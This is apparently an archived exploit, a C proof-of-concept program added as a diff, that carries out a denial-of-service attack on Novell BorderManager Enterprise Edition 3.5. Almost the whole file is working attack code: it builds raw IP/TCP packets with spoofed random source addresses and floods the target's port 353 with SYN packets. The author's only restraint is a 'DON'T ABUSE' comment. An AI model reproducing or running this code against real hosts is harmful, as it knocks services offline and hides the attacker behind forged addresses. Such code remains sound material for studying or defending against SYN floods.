@@ -1,0 +1,186 @@
+/* 29.4.2001 honoriak@mail.ru
+   Proof of concept DoS Novell BorderManager Enterprise Edition 3.5
+   helisec
+   DoSs are lame, i know, but boredom is ugly. DON'T ABUSE.
+   greets: jimjones, doing, darkcode for his paper about raw sockets 
+   and all helisec guys.
+*/
+
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+#include <time.h>  
+#include <sys/types.h>
+#include <sys/stat.h> 
+#include <sys/socket.h>
+#include <netdb.h>
+#include <arpa/inet.h>
+#include <netinet/in.h>
+#include <netinet/ip.h>
+
+#define __FAVOR_BSD
+#include <netinet/tcp.h>
+
+#define PORT 353 
+
+ /* to be easier the processing, this struct :) */
+ 
+ struct pseudohdr {
+         struct in_addr saddr;
+         struct in_addr daddr;
+         u_char zero;
+         u_char protocol;
+         u_short len;
+         struct tcphdr tcpheader;
+     }pseudoh;
+                                    
+
+unsigned long resolve(name)  
+	char *name;
+ {
+
+struct in_addr h2;
+struct hostent *hname;
+
+if (!(hname = gethostbyname(name))) return(0);
+memcpy((char *)&h2.s_addr, hname->h_addr, hname->h_length);
+return(h2.s_addr);
+}
+               
+ /* checksum ripped and modified by me */
+ 
+u_short
+checksum (data, length)
+	u_short *data;
+	u_short length;
+{
+
+register long value;
+u_short i;
+    
+      for (i = 0; i < (length >> 1); i++)
+       value += data[i];
+          
+       if ((length & 1) == 1)
+       value += (data[i] << 8);
+                
+       value = (value & 65535) + (value >> 16);
+                  
+       return (~value);
+}
+                    
+
+void packet(vic, socket) 
+	struct sockaddr_in *vic;
+	int socket;
+ {
+ 
+ int count;
+ char buf[40];
+                     
+ struct ip *ipheader = (struct ip *)buf;
+ struct tcphdr *tcpheader = (struct tcphdr *)(buf + sizeof(struct ip));
+ 
+ bzero (&buf, (sizeof(struct ip) + sizeof(struct tcphdr)) );
+ 
+ 	/* filling ip struct */
+ 	
+ 	ipheader->ip_v = IPVERSION;
+ 	ipheader->ip_hl = 5;
+ 	ipheader->ip_tos = htons(0);
+ 	ipheader->ip_len = htons(sizeof(buf));
+ 	ipheader->ip_id = rand() % 0xffff;
+ 	ipheader->ip_off = htons(0);
+ 	ipheader->ip_ttl = 0xff;  /* 255 hex */
+ 	ipheader->ip_p = IPPROTO_TCP;
+ 	ipheader->ip_src.s_addr = rand();
+ 	ipheader->ip_dst.s_addr = vic->sin_addr.s_addr;
+ 	ipheader->ip_sum = 0;
+ 	
+ 	/* filling tcphdr struct */
+ 	
+ 	tcpheader->th_sport = 2424; /* random */
+ 	tcpheader->th_dport = vic->sin_port;
+ 	tcpheader->th_seq = htonl(0xF1C); /* random */
+ 	tcpheader->th_ack = 0;
+ 	tcpheader->th_off = 5;
+ 	tcpheader->th_flags = TH_SYN; /* the important flag */
+ 	tcpheader->th_win = 4096;
+ 	tcpheader->th_sum = 0;   
+ 	
+
+ bzero (&pseudoh, 12 + sizeof(struct tcphdr));
+ pseudoh.saddr.s_addr = rand();
+ pseudoh.daddr.s_addr = vic->sin_addr.s_addr;
+ pseudoh.protocol = 6;
+ pseudoh.len = htons (sizeof(struct tcphdr));
+ memcpy((char *)&pseudoh.tcpheader, (char *)tcpheader, sizeof (struct tcphdr));
+ tcpheader->th_sum = checksum((u_short *)&pseudoh, 12 + sizeof (struct tcphdr));
+  
+ /* sending packets, DON'T ABUSE! */
+
+for (count = 0; count < 260; count++) {
+  if ( (sendto(socket, 
+ 	   buf, 
+ 	   (sizeof(struct iphdr) + sizeof(struct tcphdr)), 
+ 	   0, 
+ 	   (struct sockaddr *)vic, 
+ 	   sizeof(struct sockaddr_in))) < 0) {
+ 	   fprintf(stderr, "Error sending packets\n"); 
+           exit(-1);
+           }              
+      }                              	                                                    
+close (socket);
+  }
+ 
+void usage(proggy) 
+	char *proggy;
+ {
+	fprintf(stderr,"DoS a Novell BorderManager Enterprise Edition 3.5\n");
+	fprintf(stderr, "honoriak@mail.ru from helisec\n");
+	fprintf(stderr, "Usage: %s host\n", proggy);
+	exit(0);
+	}
+
+main(argc, argv) 
+	int argc;
+	char *argv[];
+	
+ {
+  
+  struct sockaddr_in h;
+  int s0ck, uno = 1;
+  
+  if (argc < 2)
+  	{
+  	usage(argv[0]);
+  	}
+  	
+  bzero(&h, sizeof(h)); 
+  h.sin_family = AF_INET;   
+  h.sin_port = htons(PORT); 
+
+if ( (inet_pton(AF_INET, argv[1], &h.sin_addr)) <= 0)
+	{
+	h.sin_addr.s_addr = resolve(argv[1]);
+	}
+	
+if (!h.sin_addr.s_addr) {
+	fprintf(stderr, "Error resolving host\n");
+	exit(-1);
+	}
+	
+if ((s0ck = socket(AF_INET, SOCK_RAW, 255)) < 0) {
+        fprintf(stderr, "Error creating raw socket, root is needed\n");
+        exit (-1);
+        }
+
+setsockopt(s0ck, SOL_SOCKET, SO_BROADCAST, &uno, sizeof(uno));
+
+packet(&h, s0ck);
+fprintf(stderr, "DoS completed.\n");
+exit(0);
+}
+
+
+// milw0rm.com [2001-05-07]
